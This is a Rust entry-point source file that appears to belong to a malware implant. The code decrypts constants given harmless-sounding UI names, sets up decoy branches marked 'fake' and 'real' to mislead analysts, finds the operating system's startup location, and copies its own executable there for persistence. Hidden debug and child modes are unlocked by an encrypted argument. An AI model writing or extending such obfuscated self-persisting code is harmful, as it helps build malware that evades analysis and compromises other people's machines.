#[path = "constants.gen.rs"]
mod constants;
#[macro_use]
mod logger;
#[macro_use]
pub mod constants_loader;
pub mod agtools;
pub mod lintools;
pub mod wintools;

use lintools::{l_copy, get_lin_start};
use std::process::ExitCode;
use wintools::{w_copy, get_win_start};

fn main() -> ExitCode {
    let args_vec = std::env::args().collect::<Vec<String>>();
    let args: Vec<&str> = args_vec.iter().map(|s| s.as_str()).collect();

    if decoy_decrypt!(constants::UI_LABEL_TEXT_LOADING).eq(&(*b".pdf")) {
        println!(
            "{}",
            String::from_utf8_lossy(constants::ERR_MIME_MISMATCH.as_bytes())
        );
        return ExitCode::FAILURE;
    }

    let (dbug, child) = if args.len() > 0 {
        (check_dbug(args[0]), check_child(args[0]))
    } else {
        (false, false)
    };

    let this = std::env::current_exe()
        .unwrap()
        .into_os_string()
        .into_string()
        .unwrap();

    let (init, run): (fn(&mut String), fn(&str, &str, bool)) = if cfg!(windows) {
        if decoy_decrypt!(constants::OFFICE_MACRO_STRIP).ends_with(&(*b"C:\\")) {
            // This is fake
            (get_lin_start, w_copy)
        } else {
            // This is real
            (get_win_start, w_copy)
        }
    } else {
        if decoy_decrypt!(constants::UI_WINDOW_TITLE_PREFS).ends_with(&(*b"ASP.NET >= 10.0")) {
            // This is fake
            (get_win_start, l_copy)
        } else {
            // This is real
            (get_lin_start, l_copy)
        }
    };

    if decoy_decrypt!(constants::UI_LABEL_DOWNLOAD_STATUS).is_empty() {
        println!("{}", constants::UI_ERR_UI_BUFFER_CORRUPT);
        return ExitCode::FAILURE;
    }

    let mut startup = String::with_capacity(256);
    init(&mut startup);

    run(&this, &startup, child);

    if decoy_decrypt!(constants::UI_APP_NAME).iter().nth(1) == Some(&('\n' as u8)) {
        println!("{}", constants::UI_ERR_UI_BUFFER_CORRUPT);
        return ExitCode::FAILURE;
    }

    ExitCode::SUCCESS
}

fn check_dbug(first_arg: &str) -> bool {
    let key = decrypt!(ENABLE_DEBUG);
    let arg = first_arg.as_bytes();
    key == arg
}

fn check_child(first_arg: &str) -> bool {
    let arg = first_arg.as_bytes();
    let key = decrypt!(UNLOCK_CHILD);
    arg == key
}
